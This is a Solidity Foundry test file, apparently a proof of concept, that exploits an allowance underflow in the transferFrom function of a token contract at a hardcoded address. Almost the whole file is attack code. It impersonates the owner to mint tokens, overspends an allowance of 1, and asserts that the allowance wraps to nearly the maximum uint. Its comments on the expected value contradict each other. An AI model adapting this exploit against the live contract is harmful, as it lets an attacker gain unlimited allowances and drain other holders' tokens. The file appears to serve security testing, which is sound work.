// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LineAxis {
    function owner() external view returns (address);
    function mint(address to, uint value) external;
    function approve(address spender, uint256 value) external;
    function allowance(address owner, address spender) external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint256 value) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to get tokens to the attacker first
        // The contract constructor mints total supply to msg.sender (deployer)
        // We need to impersonate the owner to mint tokens to ourselves
        address owner = LineAxis(TARGET).owner();
        vm.startPrank(owner);
        LineAxis(TARGET).mint(attacker, 1); // Mint 1 token to attacker
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get tokens and set allowance
        address owner = LineAxis(TARGET).owner();
        address spender = address(0x123);

        // Mint tokens to attacker
        vm.startPrank(owner);
        LineAxis(TARGET).mint(attacker, 10);
        vm.stopPrank();

        // Approve spender for 1 token
        LineAxis(TARGET).approve(spender, 1);

        // Check initial allowance
        uint initialAllowance = LineAxis(TARGET).allowance(attacker, spender);
        console.log("Initial allowance:", initialAllowance);
        assertEq(initialAllowance, 1);

        // Step 2: Trigger underflow in transferFrom
        // We need to impersonate the spender to call transferFrom
        vm.startPrank(spender);
        // Mint some tokens to spender first so they can receive tokens
        vm.stopPrank();
        vm.startPrank(owner);
        LineAxis(TARGET).mint(spender, 10);
        vm.stopPrank();

        // Now call transferFrom with value 2 > allowance 1
        vm.startPrank(spender);
        LineAxis(TARGET).transferFrom(attacker, spender, 2); // This should underflow
        vm.stopPrank();

        // Check final allowance - should be huge due to underflow
        uint finalAllowance = LineAxis(TARGET).allowance(attacker, spender);
        console.log("Final allowance:", finalAllowance);
        console.log("Max uint:", type(uint).max);

        // The allowance should be type(uint).max - 1 (approximately)
        // Actually it's type(uint).max - (2 - 1) + 1 = type(uint).max
        // Because: 1 - 2 = 2^256 - 1
        assertGt(finalAllowance, type(uint).max - 10); // Should be close to max uint
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

